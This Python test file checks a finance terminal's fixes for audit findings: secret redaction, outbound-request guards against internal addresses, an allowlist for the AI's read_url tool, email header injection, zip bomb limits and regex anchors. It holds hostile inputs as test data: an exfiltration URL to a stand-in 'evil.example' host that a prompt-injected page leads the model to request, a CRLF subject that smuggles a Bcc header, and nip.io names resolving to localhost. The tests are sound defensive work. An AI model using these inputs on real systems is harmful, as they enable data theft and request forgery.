"""Audit group 2 (secrets, outbound network guard, web read policy, delivery, zip bomb, regex anchors).

One test group per finding id. Each test failed on the code before its fix (see the audit notes in docs/review).
No test here touches the network: DNS is always a fake resolver.
"""

from __future__ import annotations

import asyncio
import base64
import io
import zipfile
from types import SimpleNamespace

import httpx
import pytest

from openterm import netguard, perf, redact
from openterm.ai import doc, web
from openterm.delivery import DeliveryError, RetryableError, webhook

# --- C-04: redaction -----------------------------------------------------------------------------------------------------------------


def test_redact_with_a_passed_set_keeps_the_global_secrets():
    """`redact(text, secrets=...)` used to REPLACE the registered secrets, so a caller that passed its own list leaked every other key."""
    redact.register(["GLOBAL-SECRET-VALUE-1"])
    try:
        out = redact.redact("a GLOBAL-SECRET-VALUE-1 b PASSED-SECRET-VALUE-2 c", secrets=["PASSED-SECRET-VALUE-2"])
        assert "GLOBAL-SECRET-VALUE-1" not in out and "PASSED-SECRET-VALUE-2" not in out
    finally:
        redact.unregister(["GLOBAL-SECRET-VALUE-1"])


def test_perf_summary_does_not_show_a_secret_in_a_path():
    """/api/perf lists request paths: a registered secret that rode in a path must not come out."""
    redact.register(["PATH-SECRET-VALUE-9"])
    try:
        perf.record("/api/thing/PATH-SECRET-VALUE-9/x", 1.0)
        assert not any("PATH-SECRET-VALUE-9" in p for p in perf.summary())
    finally:
        redact.unregister(["PATH-SECRET-VALUE-9"])


def test_notebook_child_gets_no_api_keys_and_the_token_is_not_on_argv(tmp_path, monkeypatch):
    from openterm.query import notebook as nb

    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-aaaaaaaaaaaaaaaa")
    monkeypatch.setenv("FRED_API_KEY", "fred-secret-value")
    monkeypatch.setenv("SOME_NEW_SERVICE_TOKEN", "tok-value")
    monkeypatch.setenv("MY_CLIENT_SECRET", "sec-value")
    monkeypatch.setenv("HARMLESS_SETTING", "keep-me")
    seen = {}

    class FakeProc:
        def poll(self):
            return None

    def fake_popen(cmd, **kw):
        seen["cmd"], seen["env"] = cmd, kw["env"]
        return FakeProc()

    monkeypatch.setattr(nb.subprocess, "Popen", fake_popen)
    monkeypatch.setattr(nb.shutil, "which", lambda _n: "uv")
    monkeypatch.setattr(nb, "_free_port", lambda: 8890)
    monkeypatch.setattr(nb, "copy_examples", lambda _d: [])
    srv = nb.NotebookServer(str(tmp_path / "x.db"), 8000)
    srv.start()
    env, cmd = seen["env"], seen["cmd"]
    for name in ("OPENROUTER_API_KEY", "FRED_API_KEY", "SOME_NEW_SERVICE_TOKEN", "MY_CLIENT_SECRET"):
        assert name not in env
    assert env["HARMLESS_SETTING"] == "keep-me" and env["OPENTERM_URL"] == "http://127.0.0.1:8000"
    assert srv.token and env["JUPYTER_TOKEN"] == srv.token  # the token travels in the environment, not in the process list
    assert not any(srv.token in part for part in cmd)


# --- C-03: outbound network guard ----------------------------------------------------------------------------------------------------


@pytest.mark.parametrize("host", ["printer.corp", "nas.lan", "intranet", "router", "localhost", "x.local", "foo.internal", "10.0.0.5"])
def test_private_host_refuses_local_names_and_single_labels(host):
    assert netguard.private_host(host) is True


def test_private_host_allows_a_public_name():
    assert netguard.private_host("hooks.slack.com") is False


def _app_with(handler):
    return SimpleNamespace(state=SimpleNamespace(keys_http=httpx.AsyncClient(transport=httpx.MockTransport(handler))))


def _send(url: str, resolver, monkeypatch):
    """Runs webhook.send against a fake network; returns the requests that left."""
    monkeypatch.delenv(webhook.ALLOW_LOCAL_ENV, raising=False)
    monkeypatch.setattr(webhook, "RESOLVER", resolver)
    sent = []

    def handler(req):
        sent.append(req)
        return httpx.Response(204)

    asyncio.run(webhook.send(_app_with(handler), {"ALERT_WEBHOOK_URL": url}, {}, "s", "t", {}))
    return sent


def test_webhook_refuses_a_public_looking_name_that_resolves_inside(monkeypatch):
    """`127.0.0.1.nip.io` is a public name that answers 127.0.0.1: only the RESOLVED address shows it."""

    async def inside(host, port):
        return ["127.0.0.1"]

    with pytest.raises(DeliveryError):
        _send("https://127.0.0.1.nip.io/x", inside, monkeypatch)


def test_webhook_refuses_a_mixed_answer(monkeypatch):
    async def mixed(host, port):
        return ["93.184.216.34", "10.0.0.7"]

    with pytest.raises(DeliveryError):
        _send("https://hooks.example.com/x", mixed, monkeypatch)


def test_webhook_sends_to_a_public_address(monkeypatch):
    async def public(host, port):
        return ["93.184.216.34"]

    assert len(_send("https://hooks.example.com/x", public, monkeypatch)) == 1


def test_webhook_own_port_comes_from_settings(monkeypatch):
    """The 'never point at OpenTerm itself' rule used a hardcoded 8000."""
    from openterm.config import get_settings

    monkeypatch.setenv(webhook.ALLOW_LOCAL_ENV, "1")
    monkeypatch.setenv("OPENTERM_PORT", "8123")
    get_settings.cache_clear()
    try:
        with pytest.raises(DeliveryError):
            webhook.check_url("http://127.0.0.1:8123/x")
        assert webhook.check_url("http://127.0.0.1:8000/x")  # not our port now
    finally:
        monkeypatch.delenv("OPENTERM_PORT")
        get_settings.cache_clear()


def test_ai_page_fetch_checks_resolved_addresses_and_local_names():
    """The AI read_url path was already resolve-based: this pins it for the two cases in the audit."""
    from openterm.ai import webfetch

    async def inside(host, port):
        return ["127.0.0.1"]

    for url in ("https://127.0.0.1.nip.io/", "https://printer.corp/", "https://intranet/"):
        with pytest.raises((netguard.Blocked, webfetch.FetchError)):
            asyncio.run(webfetch.safe_fetch(url, resolver=inside))


# --- C-11: read_url is an allowlist --------------------------------------------------------------------------------------------------


def test_policy_refuses_a_url_nobody_named_or_listed():
    """A prompt-injected page makes the model invent https://evil.example/collect?p=AAPL,MSFT: it was never seen, so the old rule let it through."""
    p = web.WebPolicy("what is AAPL doing")
    msg = p.before("read_url", {"url": "https://evil.example/collect?p=AAPL,MSFT"})
    assert msg and "ASK THE USER" in msg
    assert p.reads == 0  # a refused call does not use up a read


def test_policy_refuses_a_user_url_with_a_changed_query():
    p = web.WebPolicy("summarise https://user.example/a")
    assert p.before("read_url", {"url": "https://user.example/a"}) is None
    assert p.before("read_url", {"url": "https://user.example/a?leak=AAPL"})


def test_policy_allows_user_and_listed_urls_and_page_urls_only_when_browsing():
    p = web.WebPolicy("summarise https://user.example/a")
    p.after("web_search", {}, "1. https://listed.example/x", True)
    assert p.before("read_url", {"url": "https://listed.example/x"}) is None
    b = web.WebPolicy("browse the site and follow links")
    b.after("read_url", {}, "see https://page.example/y", True)
    assert b.before("read_url", {"url": "https://page.example/y"}) is None
    assert b.before("read_url", {"url": "https://never-seen.example/z"})  # browsing opens links found in pages, not invented ones


# --- M-05: delivery ------------------------------------------------------------------------------------------------------------------


def test_retry_after_is_capped():
    from openterm import delivery

    huge = RetryableError("x", retry_after=1e9)
    assert delivery.retry_wait(30.0, huge) == delivery.BACKOFF_S[-1]
    assert delivery.retry_wait(30.0, RetryableError("x", retry_after=float("inf"))) == delivery.BACKOFF_S[-1]
    assert delivery.retry_wait(30.0, RetryableError("x", retry_after=float("nan"))) == 30.0
    assert delivery.retry_wait(30.0, RetryableError("x", retry_after=90)) == 90.0
    assert delivery.retry_wait(30.0, ConnectionError("blip")) == 30.0


@pytest.mark.parametrize("subject", ["a\rb", "a\r\nBcc: x@y.z", "a\nb", "a b", "a\x0bb"])
def test_email_subject_cannot_break_the_header(subject):
    from openterm.delivery import email

    msg = email.build_message("from@x.example", "to@x.example", subject, "body")
    value = str(msg["Subject"])
    assert not any(c in value for c in "\r\n \x0b\x0c\x85")
    assert "Bcc" not in msg  # nothing was injected as a header


def test_picture_limit_fits_inside_the_body_limit():
    """PICTURE_MAX was 8 MB while the body limit is 4 MB, and base64 adds a third: the limit could never be reached."""
    from openterm import http_util
    from openterm.delivery import routes

    assert routes.PICTURE_MAX * 4 // 3 + 4096 <= http_util.MAX_BODY
    png = b"\x89PNG\r\n\x1a\n" + b"0" * (routes.PICTURE_MAX - 8)
    body = {"channels": ["TG"], "name": "a.png", "png_base64": base64.b64encode(png).decode()}
    assert len(str(body)) <= http_util.MAX_BODY  # the biggest allowed picture still fits in one request


# --- M-08: zip bomb ------------------------------------------------------------------------------------------------------------------


def _zip(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in files.items():
            z.writestr(name, data)
    return buf.getvalue()


def test_docx_member_over_the_limit_is_refused(monkeypatch):
    monkeypatch.setattr(doc, "MAX_ZIP_MEMBER_BYTES", 1000)
    data = _zip({"word/document.xml": b"<a>" + b"x" * 5000 + b"</a>"})
    with pytest.raises(ValueError, match="TOO LARGE"):
        doc._docx(data)


def test_xlsx_member_over_the_limit_is_refused_and_not_relabelled(monkeypatch):
    monkeypatch.setattr(doc, "MAX_ZIP_MEMBER_BYTES", 1000)
    data = _zip({"xl/workbook.xml": b"<a/>", "xl/sharedStrings.xml": b"<a>" + b"x" * 5000 + b"</a>"})
    with pytest.raises(ValueError, match="TOO LARGE"):  # not swallowed into "NOT A READABLE XLSX FILE"
        doc._xlsx(data)


def test_xlsx_total_over_the_limit_is_refused(monkeypatch):
    monkeypatch.setattr(doc, "MAX_ZIP_MEMBER_BYTES", 1000)
    monkeypatch.setattr(doc, "MAX_ZIP_TOTAL_BYTES", 1500)
    wb = b'<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="S" sheetId="1"/></sheets></workbook>'
    data = _zip({"xl/workbook.xml": wb, "xl/sharedStrings.xml": b"<a>" + b"x" * 900 + b"</a>", "xl/worksheets/sheet1.xml": b"<a>" + b"y" * 900 + b"</a>"})
    with pytest.raises(ValueError, match="TOO LARGE"):
        doc._xlsx(data)


def test_a_normal_docx_still_reads():
    body = (b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>hello</w:t></w:r></w:p></w:body></w:document>')
    assert doc._docx(_zip({"word/document.xml": body})) == "hello"


# --- H-15: `$` lets a trailing newline through ----------------------------------------------------------------------------------------


def test_ai_symbol_and_model_patterns_refuse_a_trailing_newline():
    from openterm import idents
    from openterm.ai import routes

    assert not idents.AI_SYMBOL_RE.match("AAPL\n")
    assert not routes.MODEL_RE.match("deepseek/x\n")
    assert not routes.NAME_RE.match("a.txt\n")
    assert not routes.IMAGE_RE.match("data:image/png;base64,AAAA\n")


def test_ai_routes_inline_checks_refuse_a_trailing_newline():
    from openterm.ai import routes

    assert routes._models({"model": "ok/model", "provider": "abc\n"}, {}) is None
    assert routes._models({"model": "ok/model", "provider": "abc"}, {}) == ("ok/model", "abc")
    draft = 'BT_DRAFT {"symbols": ["AAPL\\n"], "rule": "SMA20 CROSS> SMA50", "range": "5Y", "interval": "1D"}'
    assert "error" in routes.parse_draft(draft)
    assert "error" not in routes.parse_draft(draft.replace("AAPL\\n", "AAPL"))
